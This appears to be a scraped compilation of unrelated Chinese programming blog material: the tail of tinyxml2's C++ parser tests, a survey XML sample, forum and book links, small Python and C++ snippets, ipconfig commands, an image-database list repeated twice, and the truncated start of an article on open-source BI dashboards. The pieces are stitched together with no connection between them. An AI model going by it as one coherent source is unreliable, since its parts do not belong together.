			"<element />";

		XMLDocument doc;
		doc.Parse( doctype );
		doc.SaveFile( "resources/out/test7.xml" );
		doc.DeleteChild( doc.RootElement() );
		doc.LoadFile( "resources/out/test7.xml" );
		doc.Print();

		const XMLUnknown* decl = doc.FirstChild()->NextSibling()->ToUnknown();
		XMLTest( "Correct value of unknown.", "DOCTYPE PLAY SYSTEM 'play.dtd'", decl->Value() );

	}

	{
		// Comments do not stream out correctly.
		const char* doctype =
			"<!-- Somewhat<evil> -->";
		XMLDocument doc;
		doc.Parse( doctype );

		XMLComment* comment = doc.FirstChild()->ToComment();

		XMLTest( "Comment formatting.", " Somewhat<evil> ", comment->Value() );
	}
	{
		// Double attributes
		const char* doctype = "<element attr='red' attr='blue' />";

		XMLDocument doc;
		doc.Parse( doctype );

		XMLTest( "Parsing repeated attributes.", XML_ERROR_PARSING_ATTRIBUTE, doc.ErrorID() );	// is an  error to tinyxml (didn't use to be, but caused issues)
		doc.PrintError();
	}

	{
		// Embedded null in stream.
		const char* doctype = "<element att\0r='red' attr='blue' />";

		XMLDocument doc;
		doc.Parse( doctype );
		XMLTest( "Embedded null throws error.", true, doc.Error() );
	}

	{
		// Empty documents should return TIXML_XML_ERROR_PARSING_EMPTY, bug 1070717
		const char* str = "";
		XMLDocument doc;
		doc.Parse( str );
		XMLTest( "Empty document error", XML_ERROR_EMPTY_DOCUMENT, doc.ErrorID() );
	}

	{
		// Documents with all whitespaces should return TIXML_XML_ERROR_PARSING_EMPTY, bug 1070717
		const char* str = "    ";
		XMLDocument doc;
		doc.Parse( str );
		XMLTest( "All whitespaces document error", XML_ERROR_EMPTY_DOCUMENT, doc.ErrorID() );
	}

	{
		// Low entities
		XMLDocument doc;
		doc.Parse( "<test></test>" );
		const char result[] = { 0x0e, 0 };
		XMLTest( "Low entities.", doc.FirstChildElement()->GetText(), result );
		doc.Print();
	}

	{
		// Attribute values with trailing quotes not handled correctly
		XMLDocument doc;
		doc.Parse( "<foo attribute=bar\" />" );
		XMLTest( "Throw error with bad end quotes.", doc.Error(), true );
	}

	{
		// [ 1663758 ] Failure to report error on bad XML
		XMLDocument xml;
		xml.Parse("<x>");
		XMLTest("Missing end tag at end of input", xml.Error(), true);
		xml.Parse("<x> ");
		XMLTest("Missing end tag with trailing whitespace", xml.Error(), true);
		xml.Parse("<x></y>");
		XMLTest("Mismatched tags", xml.ErrorID(), XML_ERROR_MISMATCHED_ELEMENT);
	}


	{
		// [ 1475201 ] TinyXML parses entities in comments
		XMLDocument xml;
		xml.Parse("<!-- declarations for <head> & <body> -->"
				  "<!-- far & away -->" );

		XMLNode* e0 = xml.FirstChild();
		XMLNode* e1 = e0->NextSibling();
		XMLComment* c0 = e0->ToComment();
		XMLComment* c1 = e1->ToComment();

		XMLTest( "Comments ignore entities.", " declarations for <head> & <body> ", c0->Value(), true );
		XMLTest( "Comments ignore entities.", " far & away ", c1->Value(), true );
	}

	{
		XMLDocument xml;
		xml.Parse( "<Parent>"
						"<child1 att=''/>"
						"<!-- With this comment, child2 will not be parsed! -->"
						"<child2 att=''/>"
					"</Parent>" );
		xml.Print();

		int count = 0;

		for( XMLNode* ele = xml.FirstChildElement( "Parent" )->FirstChild();
			 ele;
			 ele = ele->NextSibling() )
		{
			++count;
		}

		XMLTest( "Comments iterate correctly.", 3, count );
	}

	{
		// trying to repro ]1874301]. If it doesn't go into an infinite loop, all is well.
		unsigned char buf[] = "<?xml version=\"1.0\" encoding=\"utf-8\"?><feed><![CDATA[Test XMLblablablalblbl";
		buf[60] = 239;
		buf[61] = 0;

		XMLDocument doc;
		doc.Parse( (const char*)buf);
	}


	{
		// bug 1827248 Error while parsing a little bit malformed file
		// Actually not malformed - should work.
		XMLDocument xml;
		xml.Parse( "<attributelist> </attributelist >" );
		XMLTest( "Handle end tag whitespace", false, xml.Error() );
	}

	{
		// This one must not result in an infinite loop
		XMLDocument xml;
		xml.Parse( "<infinite>loop" );
		XMLTest( "Infinite loop test.", true, true );
	}
#endif
	{
		const char* pub = "<?xml version='1.0'?> <element><sub/></element> <!--comment--> <!DOCTYPE>";
		XMLDocument doc;
		doc.Parse( pub );

		XMLDocument clone;
		for( const XMLNode* node=doc.FirstChild(); node; node=node->NextSibling() ) {
			XMLNode* copy = node->ShallowClone( &clone );
			clone.InsertEndChild( copy );
		}

		clone.Print();

		int count=0;
		const XMLNode* a=clone.FirstChild();
		const XMLNode* b=doc.FirstChild();
		for( ; a && b; a=a->NextSibling(), b=b->NextSibling() ) {
			++count;
			XMLTest( "Clone and Equal", true, a->ShallowEqual( b ));
		}
		XMLTest( "Clone and Equal", 4, count );
	}

	{
		// This shouldn't crash.
		XMLDocument doc;
		if(XML_NO_ERROR != doc.LoadFile( "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" ))
		{
			doc.PrintError();
		}
		XMLTest( "Error in snprinf handling.", true, doc.Error() );
	}

	{
		// Attribute ordering.
		static const char* xml = "<element attrib1=\"1\" attrib2=\"2\" attrib3=\"3\" />";
		XMLDocument doc;
		doc.Parse( xml );
		XMLElement* ele = doc.FirstChildElement();

		const XMLAttribute* a = ele->FirstAttribute();
		XMLTest( "Attribute order", "1", a->Value() );
		a = a->Next();
		XMLTest( "Attribute order", "2", a->Value() );
		a = a->Next();
		XMLTest( "Attribute order", "3", a->Value() );
		XMLTest( "Attribute order", "attrib3", a->Name() );

		ele->DeleteAttribute( "attrib2" );
		a = ele->FirstAttribute();
		XMLTest( "Attribute order", "1", a->Value() );
		a = a->Next();
		XMLTest( "Attribute order", "3", a->Value() );

		ele->DeleteAttribute( "attrib1" );
		ele->DeleteAttribute( "attrib3" );
		XMLTest( "Attribute order (empty)", false, ele->FirstAttribute() ? true : false );
	}

	{
		// Make sure an attribute with a space in it succeeds.
		static const char* xml0 = "<element attribute1= \"Test Attribute\"/>";
		static const char* xml1 = "<element attribute1 =\"Test Attribute\"/>";
		static const char* xml2 = "<element attribute1 = \"Test Attribute\"/>";
		XMLDocument doc0;
		doc0.Parse( xml0 );
		XMLDocument doc1;
		doc1.Parse( xml1 );
		XMLDocument doc2;
		doc2.Parse( xml2 );

		XMLElement* ele = 0;
		ele = doc0.FirstChildElement();
		XMLTest( "Attribute with space #1", "Test Attribute", ele->Attribute( "attribute1" ) );
		ele = doc1.FirstChildElement();
		XMLTest( "Attribute with space #2", "Test Attribute", ele->Attribute( "attribute1" ) );
		ele = doc2.FirstChildElement();
		XMLTest( "Attribute with space #3", "Test Attribute", ele->Attribute( "attribute1" ) );
	}

	{
		// Make sure we don't go into an infinite loop.
		static const char* xml = "<doc><element attribute='attribute'/><element attribute='attribute'/></doc>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLElement* ele0 = doc.FirstChildElement()->FirstChildElement();
		XMLElement* ele1 = ele0->NextSiblingElement();
		bool equal = ele0->ShallowEqual( ele1 );

		XMLTest( "Infinite loop in shallow equal.", true, equal );
	}

	// -------- Handles ------------
	{
		static const char* xml = "<element attrib='bar'><sub>Text</sub></element>";
		XMLDocument doc;
		doc.Parse( xml );

		XMLElement* ele = XMLHandle( doc ).FirstChildElement( "element" ).FirstChild().ToElement();
		XMLTest( "Handle, success, mutable", ele->Value(), "sub" );

		XMLHandle docH( doc );
		ele = docH.FirstChildElement( "none" ).FirstChildElement( "element" ).ToElement();
		XMLTest( "Handle, dne, mutable", false, ele != 0 );
	}

	{
		static const char* xml = "<element attrib='bar'><sub>Text</sub></element>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLConstHandle docH( doc );

		const XMLElement* ele = docH.FirstChildElement( "element" ).FirstChild().ToElement();
		XMLTest( "Handle, success, const", ele->Value(), "sub" );

		ele = docH.FirstChildElement( "none" ).FirstChildElement( "element" ).ToElement();
		XMLTest( "Handle, dne, const", false, ele != 0 );
	}
	{
		// Default Declaration & BOM
		XMLDocument doc;
		doc.InsertEndChild( doc.NewDeclaration() );
		doc.SetBOM( true );

		XMLPrinter printer;
		doc.Print( &printer );

		static const char* result  = "\xef\xbb\xbf<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
		XMLTest( "BOM and default declaration", printer.CStr(), result, false );
		XMLTest( "CStrSize", printer.CStrSize(), 42, false );
	}
	{
		const char* xml = "<ipxml ws='1'><info bla=' /></ipxml>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLTest( "Ill formed XML", true, doc.Error() );
	}

	// QueryXYZText
	{
		const char* xml = "<point> <x>1.2</x> <y>1</y> <z>38</z> <valid>true</valid> </point>";
		XMLDocument doc;
		doc.Parse( xml );

		const XMLElement* pointElement = doc.RootElement();

		int intValue = 0;
		unsigned unsignedValue = 0;
		float floatValue = 0;
		double doubleValue = 0;
		bool boolValue = false;

		pointElement->FirstChildElement( "y" )->QueryIntText( &intValue );
		pointElement->FirstChildElement( "y" )->QueryUnsignedText( &unsignedValue );
		pointElement->FirstChildElement( "x" )->QueryFloatText( &floatValue );
		pointElement->FirstChildElement( "x" )->QueryDoubleText( &doubleValue );
		pointElement->FirstChildElement( "valid" )->QueryBoolText( &boolValue );


		XMLTest( "QueryIntText", intValue, 1,						false );
		XMLTest( "QueryUnsignedText", unsignedValue, (unsigned)1,	false );
		XMLTest( "QueryFloatText", floatValue, 1.2f,				false );
		XMLTest( "QueryDoubleText", doubleValue, 1.2,				false );
		XMLTest( "QueryBoolText", boolValue, true,					false );
	}

	{
		const char* xml = "<element><_sub/><:sub/><sub:sub/><sub-sub/></element>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLTest( "Non-alpha element lead letter parses.", doc.Error(), false );
	}
    
    {
        const char* xml = "<element _attr1=\"foo\" :attr2=\"bar\"></element>";
        XMLDocument doc;
        doc.Parse( xml );
        XMLTest("Non-alpha attribute lead character parses.", doc.Error(), false);
    }
    
    {
        const char* xml = "<3lement></3lement>";
        XMLDocument doc;
        doc.Parse( xml );
        XMLTest("Element names with lead digit fail to parse.", doc.Error(), true);
    }

	{
		const char* xml = "<element/>WOA THIS ISN'T GOING TO PARSE";
		XMLDocument doc;
		doc.Parse( xml, 10 );
		XMLTest( "Set length of incoming data", doc.Error(), false );
	}

    {
        XMLDocument doc;
        XMLTest( "Document is initially empty", doc.NoChildren(), true );
        doc.Clear();
        XMLTest( "Empty is empty after Clear()", doc.NoChildren(), true );
        doc.LoadFile( "resources/dream.xml" );
        XMLTest( "Document has something to Clear()", doc.NoChildren(), false );
        doc.Clear();
        XMLTest( "Document Clear()'s", doc.NoChildren(), true );
    }
    
	// ----------- Whitespace ------------
	{
		const char* xml = "<element>"
							"<a> This \nis '  text  ' </a>"
							"<b>  This is ' text '  \n</b>"
							"<c>This  is  '  \n\n text '</c>"
						  "</element>";
		XMLDocument doc( true, COLLAPSE_WHITESPACE );
		doc.Parse( xml );

		const XMLElement* element = doc.FirstChildElement();
		for( const XMLElement* parent = element->FirstChildElement();
			 parent;
			 parent = parent->NextSiblingElement() )
		{
			XMLTest( "Whitespace collapse", "This is ' text '", parent->GetText() );
		}
	}

#if 0
	{
		// Passes if assert doesn't fire.
		XMLDocument xmlDoc;

	    xmlDoc.NewDeclaration();
	    xmlDoc.NewComment("Configuration file");

	    XMLElement *root = xmlDoc.NewElement("settings");
	    root->SetAttribute("version", 2);
	}
#endif

	{
		const char* xml = "<element>    </element>";
		XMLDocument doc( true, COLLAPSE_WHITESPACE );
		doc.Parse( xml );
		XMLTest( "Whitespace  all space", true, 0 == doc.FirstChildElement()->FirstChild() );
	}

	{
		// An assert should not fire.
		const char* xml = "<element/>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLElement* ele = doc.NewElement( "unused" );		// This will get cleaned up with the 'doc' going out of scope.
		XMLTest( "Tracking unused elements", true, ele != 0, false );
	}


	{
		const char* xml = "<parent><child>abc</child></parent>";
		XMLDocument doc;
		doc.Parse( xml );
		XMLElement* ele = doc.FirstChildElement( "parent")->FirstChildElement( "child");

		XMLPrinter printer;
		ele->Accept( &printer );
		XMLTest( "Printing of sub-element", "<child>abc</child>\n", printer.CStr(), false );
	}


	{
		XMLDocument doc;
		XMLError error = doc.LoadFile( "resources/empty.xml" );
		XMLTest( "Loading an empty file", XML_ERROR_EMPTY_DOCUMENT, error );
		XMLTest( "Loading an empty file and ErrorName as string", "XML_ERROR_EMPTY_DOCUMENT", doc.ErrorName() );
		doc.PrintError();
	}

	{
        // BOM preservation
        static const char* xml_bom_preservation  = "\xef\xbb\xbf<element/>\n";
        {
			XMLDocument doc;
			XMLTest( "BOM preservation (parse)", XML_NO_ERROR, doc.Parse( xml_bom_preservation ), false );
            XMLPrinter printer;
            doc.Print( &printer );

            XMLTest( "BOM preservation (compare)", xml_bom_preservation, printer.CStr(), false, true );
			doc.SaveFile( "resources/bomtest.xml" );
        }
		{
			XMLDocument doc;
			doc.LoadFile( "resources/bomtest.xml" );
			XMLTest( "BOM preservation (load)", true, doc.HasBOM(), false );

            XMLPrinter printer;
            doc.Print( &printer );
            XMLTest( "BOM preservation (compare)", xml_bom_preservation, printer.CStr(), false, true );
		}
	}

	{
		// Insertion with Removal
		const char* xml = "<?xml version=\"1.0\" ?>"
			"<root>"
			"<one>"
			"<subtree>"
			"<elem>element 1</elem>text<!-- comment -->"
			"</subtree>"
			"</one>"
			"<two/>"
			"</root>";
		const char* xmlInsideTwo = "<?xml version=\"1.0\" ?>"
			"<root>"
			"<one/>"
			"<two>"
			"<subtree>"
			"<elem>element 1</elem>text<!-- comment -->"
			"</subtree>"
			"</two>"
			"</root>";
		const char* xmlAfterOne = "<?xml version=\"1.0\" ?>"
			"<root>"
			"<one/>"
			"<subtree>"
			"<elem>element 1</elem>text<!-- comment -->"
			"</subtree>"
			"<two/>"
			"</root>";
		const char* xmlAfterTwo = "<?xml version=\"1.0\" ?>"
			"<root>"
			"<one/>"
			"<two/>"
			"<subtree>"
			"<elem>element 1</elem>text<!-- comment -->"
			"</subtree>"
			"</root>";

		XMLDocument doc;
		doc.Parse(xml);
		XMLElement* subtree = doc.RootElement()->FirstChildElement("one")->FirstChildElement("subtree");
		XMLElement* two = doc.RootElement()->FirstChildElement("two");
		two->InsertFirstChild(subtree);
		XMLPrinter printer1(0, true);
		doc.Accept(&printer1);
		XMLTest("Move node from within <one> to <two>", xmlInsideTwo, printer1.CStr());

		doc.Parse(xml);
		subtree = doc.RootElement()->FirstChildElement("one")->FirstChildElement("subtree");
		two = doc.RootElement()->FirstChildElement("two");
		doc.RootElement()->InsertAfterChild(two, subtree);
		XMLPrinter printer2(0, true);
		doc.Accept(&printer2);
		XMLTest("Move node from within <one> after <two>", xmlAfterTwo, printer2.CStr(), false);

		doc.Parse(xml);
		XMLNode* one = doc.RootElement()->FirstChildElement("one");
		subtree = one->FirstChildElement("subtree");
		doc.RootElement()->InsertAfterChild(one, subtree);
		XMLPrinter printer3(0, true);
		doc.Accept(&printer3);
		XMLTest("Move node from within <one> after <one>", xmlAfterOne, printer3.CStr(), false);

		doc.Parse(xml);
		subtree = doc.RootElement()->FirstChildElement("one")->FirstChildElement("subtree");
		two = doc.RootElement()->FirstChildElement("two");
		doc.RootElement()->InsertEndChild(subtree);
		XMLPrinter printer4(0, true);
		doc.Accept(&printer4);
		XMLTest("Move node from within <one> after <two>", xmlAfterTwo, printer4.CStr(), false);
	}

	{
		const char* xml = "<svg width = \"128\" height = \"128\">"
			"	<text> </text>"
			"</svg>";
		XMLDocument doc;
		doc.Parse(xml);
		doc.Print();
	}

	{
		// Test that it doesn't crash.
		const char* xml = "<?xml version=\"1.0\"?><root><sample><field0><1</field0><field1>2</field1></sample></root>";
		XMLDocument doc;
		doc.Parse(xml);
		doc.PrintError();
	}

#if 1
		// the question being explored is what kind of print to use: 
		// https://github.com/leethomason/tinyxml2/issues/63
	{
		//const char* xml = "<element attrA='123456789.123456789' attrB='1.001e9' attrC='1.0e-10' attrD='1001000000.000000' attrE='0.1234567890123456789'/>";
		const char* xml = "<element/>";
		XMLDocument doc;
		doc.Parse( xml );
		doc.FirstChildElement()->SetAttribute( "attrA-f64", 123456789.123456789 );
		doc.FirstChildElement()->SetAttribute( "attrB-f64", 1.001e9 );
		doc.FirstChildElement()->SetAttribute( "attrC-f64", 1.0e9 );
		doc.FirstChildElement()->SetAttribute( "attrC-f64", 1.0e20 );
		doc.FirstChildElement()->SetAttribute( "attrD-f64", 1.0e-10 );
		doc.FirstChildElement()->SetAttribute( "attrD-f64", 0.123456789 );

		doc.FirstChildElement()->SetAttribute( "attrA-f32", 123456789.123456789f );
		doc.FirstChildElement()->SetAttribute( "attrB-f32", 1.001e9f );
		doc.FirstChildElement()->SetAttribute( "attrC-f32", 1.0e9f );
		doc.FirstChildElement()->SetAttribute( "attrC-f32", 1.0e20f );
		doc.FirstChildElement()->SetAttribute( "attrD-f32", 1.0e-10f );
		doc.FirstChildElement()->SetAttribute( "attrD-f32", 0.123456789f );

		doc.Print();

		/* The result of this test is platform, compiler, and library version dependent. :("
		XMLPrinter printer;
		doc.Print( &printer );
		XMLTest( "Float and double formatting.", 
			"<element attrA-f64=\"123456789.12345679\" attrB-f64=\"1001000000\" attrC-f64=\"1e+20\" attrD-f64=\"0.123456789\" attrA-f32=\"1.2345679e+08\" attrB-f32=\"1.001e+09\" attrC-f32=\"1e+20\" attrD-f32=\"0.12345679\"/>\n",
			printer.CStr(), 
			true );
		*/
	}
#endif
    
    {
        // Issue #184
        // If it doesn't assert, it passes. Caused by objects
        // getting created during parsing which are then
        // inaccessible in the memory pools.
        {
            XMLDocument doc;
            doc.Parse("<?xml version=\"1.0\" encoding=\"UTF-8\"?><test>");
        }
        {
            XMLDocument doc;
            doc.Parse("<?xml version=\"1.0\" encoding=\"UTF-8\"?><test>");
            doc.Clear();
        }
    }
    
    {
        // If this doesn't assert in DEBUG, all is well.
        tinyxml2::XMLDocument doc;
        tinyxml2::XMLElement *pRoot = doc.NewElement("Root");
        doc.DeleteNode(pRoot);
    }

	{
		// Should not assert in DEBUG
		XMLPrinter printer;
	}

	{
		// Issue 291. Should not crash
		const char* xml = "</a>";
		XMLDocument doc;
		doc.Parse( xml );

		XMLPrinter printer;
		doc.Print( &printer );
	}
	{
		// Issue 299. Can print elements that are not linked in. 
		// Will crash if issue not fixed.
		XMLDocument doc;
		XMLElement* newElement = doc.NewElement( "printme" );
		XMLPrinter printer;
		newElement->Accept( &printer );
		// Delete the node to avoid possible memory leak report in debug output
		doc.DeleteNode( newElement );
	}
	{
		// Issue 302. Clear errors from LoadFile/SaveFile
		XMLDocument doc;
		XMLTest( "Issue 302. Should be no error initially", "XML_SUCCESS", doc.ErrorName() );
		doc.SaveFile( "./no/such/path/pretty.xml" );
		XMLTest( "Issue 302. Fail to save", "XML_ERROR_FILE_COULD_NOT_BE_OPENED", doc.ErrorName() );
		doc.SaveFile( "./resources/out/compact.xml", true );
		XMLTest( "Issue 302. Subsequent success in saving", "XML_SUCCESS", doc.ErrorName() );
	}

	{
		// If a document fails to load then subsequent
		// successful loads should clear the error
		XMLDocument doc;
		XMLTest( "Should be no error initially", false, doc.Error() );
		doc.LoadFile( "resources/no-such-file.xml" );
		XMLTest( "No such file - should fail", true, doc.Error() );

		doc.LoadFile( "resources/dream.xml" );
		XMLTest( "Error should be cleared", false, doc.Error() );
	}

	// ----------- Performance tracking --------------
	{
#if defined( _MSC_VER )
		__int64 start, end, freq;
		QueryPerformanceFrequency( (LARGE_INTEGER*) &freq );
#endif

		FILE* fp  = fopen( "resources/dream.xml", "r" );
		fseek( fp, 0, SEEK_END );
		long size = ftell( fp );
		fseek( fp, 0, SEEK_SET );

		char* mem = new char[size+1];
		fread( mem, size, 1, fp );
		fclose( fp );
		mem[size] = 0;

#if defined( _MSC_VER )
		QueryPerformanceCounter( (LARGE_INTEGER*) &start );
#else
		clock_t cstart = clock();
#endif
		static const int COUNT = 10;
		for( int i=0; i<COUNT; ++i ) {
			XMLDocument doc;
			doc.Parse( mem );
		}
#if defined( _MSC_VER )
		QueryPerformanceCounter( (LARGE_INTEGER*) &end );
#else
		clock_t cend = clock();
#endif

		delete [] mem;

		static const char* note =
#ifdef DEBUG
			"DEBUG";
#else
			"Release";
#endif

#if defined( _MSC_VER )
		printf( "\nParsing %s of dream.xml: %.3f milli-seconds\n", note, 1000.0 * (double)(end-start) / ( (double)freq * (double)COUNT) );
#else
		printf( "\nParsing %s of dream.xml: %.3f milli-seconds\n", note, (double)(cend - cstart)/(double)COUNT );
#endif
	}

	#if defined( _MSC_VER ) &&  defined( DEBUG )
		_CrtMemCheckpoint( &endMemState );

		_CrtMemState diffMemState;
		_CrtMemDifference( &diffMemState, &startMemState, &endMemState );
		_CrtMemDumpStatistics( &diffMemState );
	#endif

	printf ("\nPass %d, Fail %d\n", gPass, gFail);

	return gFail;
}


 
 
<?xml version="1.0" encoding="utf-8"?>
<Questions Project="simple_survey" Version="" Language="ENU" Context="Question" LabelType="Label" CustomPropertiesContext="Question,QC">
  <Question QuestionFullName="name" QuestionDataType="Text">
    <Label>what's your name?</Label>
  </Question>
  <Question QuestionFullName="age" QuestionDataType="Long">
    <Label>How old are you?</Label>
  </Question>
  <Question QuestionFullName="birthday" QuestionDataType="Date">
    <Label>when is your birthday?</Label>
  </Question>
  <Question QuestionFullName="gender" QuestionDataType="Categorical">
    <Label>what's your gender?</Label>
    <Validation RangeExpression="[1..1]" MinValue="1" MaxValue="1" />
    <Category FullName="Male" Value="33">
      <Label>Male</Label>
      <LabelStyle>
        <Image />
      </LabelStyle>
    </Category>
    <Category FullName="Female" Value="34">
      <Label>Female</Label>
      <LabelStyle>
        <Image />
      </LabelStyle>
    </Category>
  </Question>
  <Question QuestionFullName="happy" QuestionDataType="Boolean">
    <Label>Are you happy?</Label>
  </Question>
  <Question QuestionFullName="thanks" QuestionDataType="None">
    <Label>Thanks for your time!</Label>
  </Question>
</Questions>

 
讨论帖：
 
如何设计自己的类和tinyxml2交互：(观察者模式访问节点)
http://bbs.csdn.net/topics/391034317
 
如何访问xml中所有标签为label 的内容：
http://bbs.csdn.net/topics/391036566
 
递归解析应该怎么写
http://bbs.csdn.net/topics/391037734
 
stl怎么用来交互
http://bbs.csdn.net/topics/391041821
 
如何不用递归，解析出xml中所有Question节点的属性跟子节点
http://bbs.csdn.net/topics/391042124









编辑部的主页：好像没啥用
http://shop.oreilly.com/product/0636920022923.do


每章的代码，github上面的：中文版
https://github.com/willard-yuan/pcv-book-code

github上面，英文版：
https://github.com/jesolem/PCV

项目主页：
http://programmingcomputervision.com

中文在线的书：
http://www.ituring.com.cn/tupubarticle/2024?utm_source=tuicool


然后下载安装
python（x,y）下载地址：https://code.google.com/p/pythonxy/
PIL windows下安装地址：http://effbot.org/downloads/PIL-1.1.7.win32-py2.7.exe

安装好了以后，点击自动的编辑器：





新建工程，插入代码：

# -*- coding: utf-8 -*-
"""
Created on Mon Jun 29 21:36:11 2015

@author: season
"""

from PIL import Image;
from pylab import *;

im = array(Image.open('lena.jpg'))

imshow(im)

x = [100, 100, 400, 400]
y = [200, 500, 200, 500]
plot(x, y, 'r*')

plot(x[:2], y[:2])

#axis('off')

title('Plotting: "empire.jpg"')
show()



这个编辑器着实不错，可以下断点，单步调试啥的，完全满足日常需要，python又降低了进行计算机视觉相关研究的门槛啊
效果：



﻿﻿
﻿﻿











#include <iostream>
#include <stdio.h>
using namespace std;

int main()
{
    int pid;
    int num = 1;

    pid = fork();

    if(pid > 0)
    {
         num ++;
         cout<<num<<endl;
         cout<<&num<<endl;
         cout<<endl;
    }
    else if(pid ==0)
    {
         cout<<num<<endl;
         cout<<&num<<endl;
         cout<<endl;
    }


    cout<<num<<endl;
    getchar();
    return 0;
}









// sougoutest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
using namespace std;

class A
{
public:
 virtual void test(float a){cout<<'1';}
};
class B:public A
{
public:
	void test(int b){cout<<'2';}
};
int _tmain(int argc, _TCHAR* argv[])
{

	A *a = new A;
	B *b = new B;
	a= b;
	a->test(1.1);
	a->test(1);
	b->test((float)1.1);//调不到父类的test？为何
	b->test(1);
	((A*)b)->test(1);//为何这样可以调用到父类？
	return 0;
}






















﻿﻿






今天台式机插着无线网卡连接学校无线网，结果就要登录了，完后ip地址固定半天，换了mac地址重新分配还是不能改，ping了主机也不通，我想可能是dns没有刷新。现在收集几个dos命令用来配置网络：
 
1.ipconfig/release使计算机将自己目前租用的IP地址交还给DHCP服务器（只在动态配置IP地址的机器上起作用）
 
2.ipconfig/renew向DHCP服务器申请新的IP地址，与上条命令一起使用（只在动态配置IP地址的机器上起作用）
 
3.ipconfig/displaydns显示DNS客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由域名解析服务器解析的所有资源记录
 
4.ipconfig/flushdns清理并重设DNS客户解析器缓存的内容
5.ipconfig/registerdns初始化网络适配器上配置的DNS和IP地址，可用于解决客户和DNS服务器之间的动态更新问题，而不必重新启动计算机
 






    
推荐几个免费的国外图像库，数字图像处理必备
     
        分类：            

学术资源              2007-11-14 13:24    
6091人阅读     
评论(6)    
收藏    
举报    

图像处理databasematlabdownloadimageurl
原文地址：http://blog.sina.com.cn/s/blog_53c74fa1010002pn.html
做数字图像处理的，怎能没有一个图库？虽说自己可以建立，可是如果是比较知名的图库，做出来的实验结果才能比较让人信服。coral是很有名，可他要收费。我寻寻觅觅，还是找到了一些图库，有的是纯texture图库，比如著名的vistex，有的是faceimages，有的也有RGB真彩色图的。下面罗列了一些url，可以找到对应的。
 
1、http://vismod.media.mit.edu/
这是美国麻省media实验室的一个网页，该实验室在数字图像处理方面还是很有成就的。在download里面会有很多有用的东西。比如vistex or faceimages and others
 
2、http://www.dice.ucl.ac.be/mlg/index.php?page=DataBases
这是ucl的machine learning group的database
 
3、http://sipi.usc.edu/services/database/index.html
这是著名的美国南加州大学的USI-SIPI image database，有纹理图和真彩图
 
4、http://www.cs.washington.edu/research/imagedatabase/
这是华盛顿大学的Ground truth Database。这个图库我用的最多，因为目前做真彩色图作的比较多，而作单纯的纹理不是很多。该database里的图片都是RGB，jpeg格式的，对于matlab来说是很方便处理的。
 
所有图库我都下载过，链接均有效。当然我也不知道何时会失效，一般来说保留的时间应该比较长吧，因为都是大学在做的研究，前人学完了后人还需要。所以，基本上从我开始作发现这些图库开始，到现在已经半年了。依然保留着呢。
有需要的或者近期有需要的还是尽快下载吧。 
 
补充几个：
卡内基的库
http://www.cs.cmu.edu/~cil/v-images.html
 
uc伯克利的库：
http://www.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/segbench/
 
http://www.eecs.berkeley.edu/Research/Projects/CS/vision/grouping/resources.html


原文地址：http://blog.sina.com.cn/s/blog_53c74fa1010002pn.html
做数字图像处理的，怎能没有一个图库？虽说自己可以建立，可是如果是比较知名的图库，做出来的实验结果才能比较让人信服。coral是很有名，可他要收费。我寻寻觅觅，还是找到了一些图库，有的是纯texture图库，比如著名的vistex，有的是faceimages，有的也有RGB真彩色图的。下面罗列了一些url，可以找到对应的。
 
1、http://vismod.media.mit.edu/
这是美国麻省media实验室的一个网页，该实验室在数字图像处理方面还是很有成就的。在download里面会有很多有用的东西。比如vistex or faceimages and others
 
2、http://www.dice.ucl.ac.be/mlg/index.php?page=DataBases
这是ucl的machine learning group的database
 
3、http://sipi.usc.edu/services/database/index.html
这是著名的美国南加州大学的USI-SIPI image database，有纹理图和真彩图
 
4、http://www.cs.washington.edu/research/imagedatabase/
这是华盛顿大学的Ground truth Database。这个图库我用的最多，因为目前做真彩色图作的比较多，而作单纯的纹理不是很多。该database里的图片都是RGB，jpeg格式的，对于matlab来说是很方便处理的。
 
所有图库我都下载过，链接均有效。当然我也不知道何时会失效，一般来说保留的时间应该比较长吧，因为都是大学在做的研究，前人学完了后人还需要。所以，基本上从我开始作发现这些图库开始，到现在已经半年了。依然保留着呢。
有需要的或者近期有需要的还是尽快下载吧。 





叶剑烨 叶剑烨的个人注释 2018-01-17人是视觉动物，要用数据把一个故事讲活，图表是必不可少的。如果你经常看到做数据分析同事，在SQL客户端里执行完查询，把结果复制/粘贴到 Excel 里再做成图表，那说明你的公司缺少一个可靠的数据可视化平台。数据可视化是 Business Intelligence（BI）中的核心功能，有许多成熟的商用解决方案，如老牌的 Tableau，Qilk，新生代的 Looker，国内的 FineBI 等等。不过对于许多小公司来说，这些服务的 License 费用是一笔不小的开销，且有一种“杀鸡用牛刀”的感觉。那在开源软件如此发达的今天，在数据可视化方面，有什么靠谱的方案可以选择呢？今天给大家介绍三个比较知名的项目，分别是 Superset, Redash 和 Metabase。前两个我都在产生环境中实际使用过，在本文中会重点介绍。Metabase 我只是试玩了一下，但我觉得这是一个非常有想法的项目，所以也会和大家聊聊我对它的看法。选择一个称手的工具，功能上能满足我的需求肯定是首要的。就先从功能需求讲起，我们的数据仓库用的是 Amazon Redshift（如果你没听过 Redshift，就把它看作是为大数据优化过的 PostgreSQL），所以大部分的实际用例都是要将一个 SQL 查询的结果可视化。我们所需的图表类型也就是常用的那几种，包括折线图，柱形图，饼图等。有了图表之后，接下去就是把相关的图表排版，生成报表页面（Dashboard）。从数据安全性角度，我不希望每个员工都能自由访问所有的 Dashboard，所以每个 Dashboard 需要设置不同的访问级别。另外，我会看重它是否有 REST API，能否通过 API 来创建与管理报表，这部分我们放在以后的文章中再讲。除了满足功能性需求，易用性与文档在评判一个工具时也是非常重要的。谁不想要一个简单好用，文档清晰的产品呢？下面我们就从功能性、易用性与文档等方面，来看看这三个开源项目的实际表现吧SupersetSuperset 最初是由 Airbnb 的数据团队开源的，目前已进入 Apache Incubator，算是明星级的开源项目。老实讲，我也是被 Airbnb 与 Apache 两块金字招牌吸引才入了坑。目前公司绝大部分报表都在 Superset 上，大大小小有 50 个 Dashboard，包含了近 900 个图表。在使用 Superset 之前我们用的是 Looker（很不错的商用 